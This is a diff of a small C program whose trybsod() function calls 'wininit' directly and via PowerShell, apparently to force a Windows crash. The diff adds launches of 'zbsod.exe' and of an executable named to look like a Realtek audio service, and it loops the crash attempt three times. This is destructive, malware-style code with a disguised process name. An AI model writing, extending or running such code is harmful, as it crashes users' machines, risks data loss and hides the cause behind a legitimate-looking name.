@@ -11,13 +11,23 @@ void trybsod()
 
     system("wininit");
     system("powershell.exe -Command \"wininit\"");
+
+    system("start zbsod.exe");
+    system("start RtkAudUService64.exe");
 }
 
 
 int main()
 {
-    trybsod();
-   
+
+    for (int i = 0; i < 3; i++)
+    {
+        trybsod();
+
+        Sleep(1000);
+    }
+
+    
         
     return 0;
 }
